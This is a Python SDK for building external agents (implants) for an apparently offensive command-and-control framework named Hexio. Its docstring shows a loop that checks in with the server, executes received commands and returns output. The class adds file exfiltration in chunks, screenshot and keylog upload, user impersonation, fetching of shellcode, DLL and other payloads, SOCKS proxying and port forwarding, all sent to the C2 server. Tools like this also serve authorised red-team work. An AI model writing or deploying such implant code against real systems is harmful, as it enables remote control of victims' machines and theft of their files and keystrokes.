"""
Hexio External Agent SDK for Python.

Usage:
    from hexio_sdk import HexioClient

    client = HexioClient("http://10.0.0.1:9000", "my-passphrase")
    reg = client.register(
        hostname="WORKSTATION",
        ip="10.0.0.50",
        user="admin",
        os_info="Windows 10",
        process="myagent.exe",
        arch="x64",
        pid=1234,
        client_type="my_agent",
        sleep_time=5,
    )
    # client.token and client.agent_id are now set

    while True:
        checkin = client.checkin()
        for cmd in checkin["commands"]:
            output = execute_locally(cmd["command"])
            client.command_response(cmd["id"], cmd["command"], output)
        time.sleep(5)
"""

import json
import base64
from typing import Optional
from urllib.request import Request, urlopen
from urllib.error import HTTPError


class HexioAPIError(Exception):
    def __init__(self, status_code: int, message: str):
        self.status_code = status_code
        self.message = message
        super().__init__(f"API error ({status_code}): {message}")


class HexioClient:
    def __init__(self, base_url: str, passphrase: str):
        self.base_url = base_url.rstrip("/")
        self.passphrase = passphrase
        self.token: Optional[str] = None
        self.agent_id: Optional[int] = None

    def _request(self, method: str, path: str, body=None) -> dict:
        url = self.base_url + path
        data = None
        if body is not None:
            data = json.dumps(body).encode("utf-8")

        req = Request(url, data=data, method=method)
        req.add_header("HexioExternalAgentAuth", self.passphrase)
        if self.token:
            req.add_header("HexioAgentToken", self.token)
        if data is not None:
            req.add_header("Content-Type", "application/json")

        try:
            with urlopen(req) as resp:
                resp_data = resp.read().decode("utf-8")
                if resp_data:
                    return json.loads(resp_data)
                return {}
        except HTTPError as e:
            error_body = e.read().decode("utf-8")
            try:
                err = json.loads(error_body)
                raise HexioAPIError(e.code, err.get("error", error_body))
            except json.JSONDecodeError:
                raise HexioAPIError(e.code, error_body)

    # --- Registration ---

    def register(
        self,
        hostname: str,
        ip: str,
        user: str,
        os_info: str,
        process: str,
        pid: int,
        arch: str,
        client_type: str,
        sleep_time: int = 0,
    ) -> dict:
        resp = self._request("POST", "/register", {
            "hostname": hostname,
            "ip": ip,
            "user": user,
            "os": os_info,
            "process": process,
            "pid": pid,
            "client_type": client_type,
            "sleep_time": sleep_time,
            "arch": arch,
        })
        self.token = resp["token"]
        self.agent_id = resp["agent_id"]
        return resp

    # --- Checkin / Sync ---

    def checkin(self) -> dict:
        return self._request("GET", "/agent/checkin")

    def sync(self, sleep_time: Optional[int] = None, sleep_jitter: Optional[int] = None) -> dict:
        payload = {}
        if sleep_time is not None:
            sleep = {"sleep_time": sleep_time}
            if sleep_jitter is not None:
                sleep["sleep_jitter"] = sleep_jitter
            payload["sleep"] = sleep

        return self._request("POST", "/agent/sync", payload if payload else None)

    # --- Command Response ---

    def command_response(self, command_id: int, command: str, response: str) -> dict:
        return self._request("POST", "/agent/command/response", {
            "command_id": command_id,
            "command": command,
            "response": response,
        })

    # --- Downloads (exfiltration) ---

    def download_init(
        self,
        file_name: str,
        agent_path: str,
        file_size: int,
        chunk_size: int,
        total_chunks: int,
    ) -> dict:
        return self._request("POST", "/agent/download/init", {
            "file_name": file_name,
            "agent_path": agent_path,
            "file_size": file_size,
            "chunk_size": chunk_size,
            "total_chunks": total_chunks,
        })

    def download_chunk(self, download_id: str, chunk_data: bytes) -> dict:
        return self._request("POST", "/agent/download/chunk", {
            "download_id": download_id,
            "chunk_data": base64.b64encode(chunk_data).decode("utf-8"),
        })

    def download_cancel(self, download_id: str) -> dict:
        return self._request("POST", "/agent/download/cancel", {
            "download_id": download_id,
        })

    def download_file(self, file_path: str, file_data: bytes, chunk_size: int = 65536) -> str:
        """Convenience: download a complete file in one call."""
        file_name = file_path.replace("\\", "/").split("/")[-1]
        total_chunks = (len(file_data) + chunk_size - 1) // chunk_size

        init = self.download_init(file_name, file_path, len(file_data), chunk_size, total_chunks)
        download_id = init["download_id"]

        for i in range(total_chunks):
            chunk = file_data[i * chunk_size : (i + 1) * chunk_size]
            self.download_chunk(download_id, chunk)

        return download_id

    # --- Screenshot ---

    def screenshot(self, filename: str, image_data: bytes) -> dict:
        return self._request("POST", "/agent/screenshot", {
            "filename": filename,
            "data": base64.b64encode(image_data).decode("utf-8"),
        })

    # --- Keylog ---

    def keylog(self, filename: str, data: str) -> dict:
        return self._request("POST", "/agent/keylog", {
            "filename": filename,
            "data": data,
        })

    # --- Impersonation ---

    def set_impersonation(self, user: str) -> dict:
        return self._request("POST", "/agent/impersonation", {"user": user})

    def clear_impersonation(self) -> dict:
        return self.set_impersonation("")

    # --- Sidechannel ---

    def sidechannel(self, channel_id: str, data_b64: str) -> dict:
        return self._request("POST", "/agent/sidechannel", {
            "channel_id": channel_id,
            "data": data_b64,
        })

    # --- File Requests ---

    def request_files(
        self,
        bof_files: Optional[list] = None,
        pe_files: Optional[list] = None,
        dll_files: Optional[list] = None,
        elf_files: Optional[list] = None,
        macho_files: Optional[list] = None,
        shellcode_files: Optional[list] = None,
        hexlang: Optional[list] = None,
    ) -> dict:
        payload = {}
        if bof_files:
            payload["bof_files"] = bof_files
        if pe_files:
            payload["pe_files"] = pe_files
        if dll_files:
            payload["dll_files"] = dll_files
        if elf_files:
            payload["elf_files"] = elf_files
        if macho_files:
            payload["macho_files"] = macho_files
        if shellcode_files:
            payload["shellcode_files"] = shellcode_files
        if hexlang:
            payload["hexlang"] = hexlang
        return self._request("POST", "/agent/files/request", payload)

    # --- SOCKS Proxy ---

    def socks_open(self, port: Optional[int] = None) -> dict:
        payload = {}
        if port is not None:
            payload["port"] = port
        return self._request("POST", "/agent/socks/open", payload)

    def socks_close(self) -> dict:
        return self._request("POST", "/agent/socks/close", {})

    def socks_sync(self, data) -> dict:
        return self._request("POST", "/agent/socks/sync", data)

    # --- Port Forward ---

    def portfwd_open(self, port: int, remote_host: str, remote_port: int) -> dict:
        return self._request("POST", "/agent/portfwd/open", {
            "port": port,
            "remote_host": remote_host,
            "remote_port": remote_port,
        })

    def portfwd_close(self, port: int) -> dict:
        return self._request("POST", "/agent/portfwd/close", {"port": port})

    def portfwd_sync(self, data) -> dict:
        return self._request("POST", "/agent/portfwd/sync", data)
